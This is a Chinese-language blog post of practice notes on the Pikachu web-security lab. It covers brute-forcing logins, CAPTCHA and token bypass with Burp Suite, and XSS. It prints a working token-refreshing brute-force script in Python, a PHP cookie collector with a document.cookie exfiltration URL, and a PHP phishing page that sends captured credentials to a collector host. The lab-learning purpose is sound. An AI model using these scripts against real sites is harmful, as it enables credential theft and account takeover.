@@ -1,0 +1,1506 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      Web靶场-Pikachu | Archeri&#39;s Blog
+    
+  </title>
+  <meta name="author" content="Archeri Shade">
+  <meta name="keywords" content="" />
+  <meta name="description" content="" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'random_you',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 7,
+      randomYouSrc: '/img/Random-img/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: false,
+	  appId: 'AU8...',
+	  appKey: '4cU...',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「Web靶场-Pikachu」
+		
+	</p>
+
+	
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="https://github.com/ArcheriShade" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" itemprop="url">
+		Web靶场-Pikachu
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/" itemprop="url">
+		<time datetime="2022-10-06T00:22:38.000Z" itemprop="dateUpdated">
+	  		2022-10-06
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/Web/" class=" ">
+			Web
+		</a>
+	
+		<a href="/tags/Web%E9%9D%B6%E5%9C%BA/" class=" ">
+			Web靶场
+		</a>
+	
+		<a href="/tags/Pikachu/" class=" ">
+			Pikachu
+		</a>
+	
+		
+			</span>
+			
+			
+
+
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<h1 id="NOTE-Pikachu靶场练习笔记"><a href="#NOTE-Pikachu靶场练习笔记" class="headerlink" title="[NOTE] Pikachu靶场练习笔记"></a>[NOTE] Pikachu靶场练习笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>是针对Pikachu靶场的练习笔记<br>是在搞完WebGoat之后<br>想着再找一个靶场玩玩</p>
+<p><strong>环境</strong><br>攻击者：Kali Linux | 10.10.10.1<br>靶机：Ubuntu | 10.10.10.2 | PHP 5.5.38+Apache 2.4.39+MySQL 8.0.16（小皮面板）</p>
+<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><blockquote>
+<p>从来没有哪个时代的黑客像今天一样热衷于猜解密码——奥斯特洛夫斯基</p>
+</blockquote>
+<h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>直接爆破就完事了</p>
+<p>一个启示：<br>最好能够根据网站本身，添加一些特殊字段<br>如网站名及其变式啥的，作为payload之一<br>（pikachu&#x2F;pikachu）</p>
+<h3 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h3><p>呃，倒是可以OCR</p>
+<p>看眼提示：</p>
+<blockquote>
+<p>这个验证码好像一直有效哎！</p>
+</blockquote>
+<p>看看，发现只要用户没有请求新的验证码，上一个验证码就会一直有效<br>因此可以直接爆破<strong>（启示：要注意验证码时效性）</strong><br>前提是发送请求的验证码要与页面显示的一致（保证没有请求新的验证码）</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023095720831.png" alt="image-20211023095720831"></p>
+<hr>
+<p>观察下验证码的元素：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023100136110.png" alt="image-20211023100136110"></p>
+<p>前端是请求时加载一次，之后只有在点击时才重新刷新<br>刷新的参数好像是时间戳，但是传入固定的一个时间戳也会刷出不同的验证码</p>
+<h3 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h3><p>验证码明文印在页面上？？？</p>
+<p>哦没事了，验证码只是前端验证<br>验证码通过后的包直接抓上来重放就完事了</p>
+<p>比上面那题还离谱</p>
+<h3 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h3><p>表单多了个隐藏field：<br><code>&lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;526966173722ea46a5804573073&quot;&gt;</code><br>虽然是token，但是直接写在HTML上了</p>
+<p>爆破方向：</p>
+<ul>
+<li>Burp Suite——定义宏操作每次请求更新token</li>
+<li>自写脚本</li>
+</ul>
+<h4 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h4><p>先写下使用Burp Suite的方法<br>&#x3D;&#x3D;日后考虑将这里搬去“Burp Suite进阶使用”之类的学习笔记&#x3D;&#x3D;</p>
+<p>有两种做法</p>
+<h5 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h5><p>来自于<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/A3f-7sP7je5DKQK_XEACJA">这里</a></p>
+<p>设置模式为“Pitchfork”（草叉模式），设定如下变量：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023104429603.png" alt="image-20211023104429603"></p>
+<p>可以看到，用户名不作爆破</p>
+<p>从响应包中抓取token的匹配值：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023104719195.png" alt="image-20211023104719195"></p>
+<p>然后第二个payload，选择类型为“Recursive grep”，再选择刚提取的token变量：</p>
+<img src="image-20211023104856508.png" alt="image-20211023104856508" style="zoom:67%;" />
+
+<p>然后注意爆破线程只能设置为1，因为要使用到提取的token值是单次传递的：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023105005794.png" alt="image-20211023105005794"></p>
+<p>由于没有对用户名字段进行爆破，所以最后爆破结果仅针对admin：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023105341536.png" alt="image-20211023105341536"></p>
+<p>另外试了试Cluster bomb对三个变量进行爆破，发现不太奏效<br>前面的请求中用户名和密码都有，但是token那块是空的</p>
+<h5 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h5><p>来自于<a target="_blank" rel="noopener" href="https://blog.g0tmi1k.com/dvwa/bruteforce-high/#L.strong.Burp.Suite..strong.">g0tmi1k的文章</a></p>
+<p>首先添加会话处理规则（Session Handling Rules）：<br><code>Project options/Options</code> -&gt; <code>Sessions</code> -&gt; <code>Session Handling Rules</code> -&gt; <code>Add</code></p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023111338072.png" alt="image-20211023111338072"></p>
+<p>这里定义的规则可以让Burp Suite在每次作出请求前<br>都检视下是否有对应的适用规则<br><em>defined scope for particular tools, URLs or parameters</em></p>
+<p>输入规则描述，并选择规则行为为“Run a macro”（执行宏，因为要替换token）：<br><code>Details</code> -&gt; <code>Rule Action</code> -&gt; <code>Add</code> -&gt; <code>Run a macro</code></p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023112033096.png" alt="image-20211023112033096"></p>
+<p>这种规则会通过运行宏或发送一连串定义好的请求<br>并基于宏的运行结果或请求的返回，自定义地更新参数或cookies</p>
+<p>选择新建一个宏：<br><code>Add</code></p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023114250132.png" alt="image-20211023114250132"></p>
+<p>然后选择想要运行宏的请求包：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023114423441.png" alt="image-20211023114423441"></p>
+<p>这里可以过滤出想要的请求包<br>要注意的是，记录宏会要求使用正在代理的浏览器，因此此时应该关闭拦截</p>
+<p>然后进一步编辑这个宏：<br><code>Macro description</code>处可以填入这个宏的说明信息<br>点击<code>Configure item</code>可以对某一选中的请求包进行宏操作编辑</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023154719530.png" alt="image-20211023154719530"></p>
+<p>可以对宏如何操作该请求包的cookie和参数等进行编辑<br>由于我们需要从每次响应中获取token<br>因此应该自定义一个响应参数：<br><code>Custom parameter locations in response</code>-&gt;<code>Add</code></p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023155449328.png" alt="image-20211023155449328"></p>
+<p>之后就是从请求包的响应中定义&#x2F;提取我们要的参数的匹配模式&#x2F;匹配位置：<br><code>Parameter name</code>中填入这个参数的参数名（任意填，可以是“fish”<del>，不和要替换的请求参数匹配？</del>）<br><del><strong>【注意】这个参数名应当和我们想要替换的请求参数名相同，这样后续才能成功匹配上要替换&#x2F;操作的请求参数</strong></del><br><code>Start after expression</code>&#x2F;<code>End at delimiter</code>中填入参数值的左右界限，建议自己从响应中拖拽选中，这样Burp Suite会自动填入这两个字段</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023155423351.png" alt="image-20211023155423351"></p>
+<p>之后一路<code>OK</code>，回到会话处理规则的宏操作定义处</p>
+<ul>
+<li>这样我们就定义了一个会话处理规则</li>
+<li>这个规则会执行一个宏操作</li>
+<li>这个宏操作会对我们选定的请求的响应中提取一个token值</li>
+<li>并把这个值存在自定义名字的参数中</li>
+</ul>
+<p>最后勾选“允许URL不匹配”：<br>勾选<code>Tolerate URL mismatch when matching parameters (use for URL-agnostic CSRF tokens)</code></p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023161139363.png" alt="image-20211023161139363"></p>
+<p>最上面选中的是我们刚定义好的宏操作，作用是提取token的值<br>&#x3D;&#x3D;下面一个箭头指向，<del>才是应用把token值替换到我们每次请求的token</del>是把所有参数（即username、password、token甚至加上submit）都作指定的操作——更新&#x2F;替换&#x3D;&#x3D;<br>再下面一个箭头指向，应该是起更新cookie的作用</p>
+<p>之后选择该规则的监视目标以及使用范围：<br><code>Scope</code>-&gt;<code>Tools Scope</code>-&gt;仅勾选<code>Intruder</code>（因为我们只在爆破里用）<br><code>URL Scope</code>-&gt;<code>Use suite scope [defined in Target tab]</code>（选择使用Burp Suite的监视窗，但理论上也能<code>Use custom scope</code>，指定到Pikachu指定的页面就🆗）</p>
+<img src="image-20211023162436455.png" alt="image-20211023162436455" style="zoom:67%;" />
+
+<p>之后将目标站点放到Burp Suite的监视窗里（由于上述的选择）：<br><code>Target</code>-&gt;<code>Site map</code>-&gt;<code>&#123;目标站点&#125;</code>-&gt;<code>Add to scope</code></p>
+<img src="image-20211023163257589.png" alt="image-20211023163257589" style="zoom:67%;" />
+
+<p>之后可能会弹出一个提示窗，提示说什么“要不要停止记录监视窗口之外的站点的代理记录”之类的，随便选</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023163408994.png" alt="image-20211023163408994"></p>
+<p>这样，Burp Suite的监视窗口就会多出我们的靶机站点：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023164427863.png" alt="image-20211023164427863"></p>
+<p>之后正常执行爆破，集束炸弹模式，线程正常设置，<strong>注意token参数不要设置payload</strong>，因为宏操作会自动完成替换：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023164932884.png" alt="image-20211023164932884"></p>
+<p>爆破正常完成，且每个请求的token值都是被替换的：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211023165252707.png" alt="image-20211023165252707"></p>
+<p>因为我们定义了一个会话操作规则，会对选定监视窗口内的每个站点在指定的操作范围内进行检视，若有匹配的站点和适用范围，则应用上相应的规则<br>这里我们的规则是在爆破处理中运行一个宏，这个宏会在每次请求前都把token值替换成请求响应中给出的新值<br>这样Burp Suite就完成了自动化更新token并进行爆破的功能，绕过了站点对爆破攻击的弱防御。</p>
+<p>&#x3D;&#x3D;剩下的疑问就是，这个宏操作到底是怎么把每次提取的token值匹配到每次请求的token参数上去的？？建议额外进阶学习Burp Suite的高阶用法&#x3D;&#x3D;</p>
+<h5 id="两种方法比较"><a href="#两种方法比较" class="headerlink" title="两种方法比较"></a>两种方法比较</h5><p>第一种就比较简单，但缺点也比较明显：</p>
+<ul>
+<li>只能针对某一特定用户进行密码爆破</li>
+<li>线程只能为1，效率低</li>
+</ul>
+<p>第二种虽然复杂了点（搞懂了过程也就那样吧….吧），但优势明显<br>学会会话处理规则、监视窗和宏操作等好处多多</p>
+<h4 id="自写脚本"><a href="#自写脚本" class="headerlink" title="自写脚本"></a>自写脚本</h4><p>没啥好说的，权当练练Python、requests还有BS4<br>直接上代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.pikachu.com/vul/burteforce/bf_token.php&quot;</span></span><br><span class="line">userList = <span class="string">&quot;/usr/share/seclists/Usernames/top-usernames-shortlist.txt&quot;</span></span><br><span class="line">pwdList = <span class="string">&quot;/usr/share/seclists/Passwords/2020-200_most_used_passwords.txt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_phpsessid</span>():</span><br><span class="line">    res0 = requests.get(url, timeout=<span class="number">2</span>)</span><br><span class="line">    phpsessid = re.<span class="keyword">match</span>(<span class="string">&quot;PHPSESSID=(.*?);&quot;</span>, res0.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])</span><br><span class="line">    phpsessid = phpsessid.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> res0, phpsessid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_token</span>(<span class="params">res</span>):</span><br><span class="line">    soup = BeautifulSoup(res.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    token = soup.find_all(<span class="string">&quot;input&quot;</span>, attrs=&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;hidden&quot;</span>, <span class="string">&quot;name&quot;</span>:<span class="string">&quot;token&quot;</span>&#125;)[<span class="number">0</span>][<span class="string">&quot;value&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">phpsessid, username, password, token</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: password, </span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">        <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Login&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    cookies = <span class="built_in">dict</span>(PHPSESSID=phpsessid)</span><br><span class="line"></span><br><span class="line">    res = requests.post(url, cookies=cookies, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(userList) <span class="keyword">as</span> file_obj_user:</span><br><span class="line">        usernames = file_obj_user.readlines()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(pwdList) <span class="keyword">as</span> file_obj_pwd:</span><br><span class="line">        passwords = file_obj_pwd.readlines()</span><br><span class="line"></span><br><span class="line">    res, phpsessid = get_phpsessid()</span><br><span class="line">    token = get_token(res)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> username <span class="keyword">in</span> usernames:</span><br><span class="line">        <span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">            username = username.rstrip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            password = password.rstrip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            res = login(phpsessid, username, password, token)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username or password is not exists～&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;username:&#123;&#125; / password:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(username, password))</span><br><span class="line">            </span><br><span class="line">            token = get_token(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    brute_force()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross Site Scripting"></a>Cross Site Scripting</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>一般的防御方法：</p>
+<ul>
+<li>输入过滤：不允许可能导致XSS的字符输入</li>
+<li>输出转义：对输出到前端的内容进行适当转义</li>
+</ul>
+<p>归纳：哪个站点有XSS，就可以得到哪个站点的cookie</p>
+<h3 id="攻击者端"><a href="#攻击者端" class="headerlink" title="攻击者端"></a>攻击者端</h3><p>最简单的情况，应该就是通过XSS捞前端用户的cookie</p>
+<p>靶场本身提供了一个<a href="www.pikachu.com/pkxss/xssmanager.php">XSS的攻击者后台</a>，模拟攻击者端可以进行的行为，这里给出了以下三种：</p>
+<ul>
+<li><p>cookie搜集</p>
+</li>
+<li><p>信息钓鱼</p>
+</li>
+<li><p>键盘记录</p>
+</li>
+</ul>
+<p>实际情况中攻击者会拥有自己的一台服务器</p>
+<p>具体怎么写代码去利用，下面就研究研究<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45868644/article/details/120192536">别人的博客</a>，并分析一波攻击代码</p>
+<h4 id="cookie搜集"><a href="#cookie搜集" class="headerlink" title="cookie搜集"></a>cookie搜集</h4><p>攻击者服务器上部署如下的捕获cookie等信息的API，文件名cookie.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 这个是获取cookie的api页面</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 前面是数据库连接相关</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过一个参数（这里是“cookie”）来接收传过来的值</span></span><br><span class="line"><span class="comment">// 获取时间、cookie、user agent等信息</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$time</span>=<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);</span><br><span class="line">    <span class="variable">$ipaddress</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">    <span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">    <span class="variable">$referer</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">    <span class="variable">$useragent</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    <span class="comment">// 将信息插入攻击者数据库</span></span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;insert cookies(time,ipaddress,cookie,referer,useragent) values(&#x27;<span class="subst">$time</span>&#x27;,&#x27;<span class="subst">$ipaddress</span>&#x27;,&#x27;<span class="subst">$cookie</span>&#x27;,&#x27;<span class="subst">$referer</span>&#x27;,&#x27;<span class="subst">$useragent</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后将页面重定向到一个可信的网站，起到迷惑作用</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:https://www.baidu.com&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>设定类似的访问URL：<a target="_blank" rel="noopener" href="http://www.pikachu.com/pkxss/xcookie/cookie.php">http://www.pikachu.com/pkxss/xcookie/cookie.php</a><br>通过指定参数来传递要捕获的信息：<br><code>&#39;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie</code></p>
+<p>如有必要，攻击者可以自己整一个专门用于查看和管理捕获信息的页面</p>
+<p>然后就是社工、钓鱼，构造一些<strong>让人防不胜防的恶意连接或内容</strong>给受害者<br>通过存在XSS漏洞的站点，来让受害者发送特定内容给攻击者<br>即让受害者通过XSS漏洞发送类似于这样的请求：</p>
+<p><code>http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&#39; + document.cookie</code></p>
+<p>具体例子见<a href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%88GET%EF%BC%89">反射型XSS（GET）</a>以及<a href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%88POST%EF%BC%89">反射型XSS（POST）</a></p>
+<h4 id="信息钓鱼"><a href="#信息钓鱼" class="headerlink" title="信息钓鱼"></a>信息钓鱼</h4><p>攻击者可以先写好下面的钓鱼脚本，文件名fish.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// var_dump($_SERVER);</span></span><br><span class="line"><span class="keyword">if</span> ((!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) || (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>]))) &#123;</span><br><span class="line">	<span class="comment">// 发送认证框，并给出迷惑性的info</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;WWW-Authenticate: Basic realm=&#x27;认证&#x27;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Authorization Required.&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>])) &amp;&amp; (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>]))) &#123;</span><br><span class="line">	<span class="comment">// 将结果发送给搜集信息的后台</span></span><br><span class="line">	<span class="comment">// xfish.php是一个将信息插入到数据库的API</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://192.168.1.15/pkxss/xfish/xfish.php?username=<span class="subst">&#123;$_SERVER[PHP_AUTH_USER]&#125;</span></span></span><br><span class="line"><span class="string">    &amp;password=<span class="subst">&#123;$_SERVER[PHP_AUTH_PW]&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
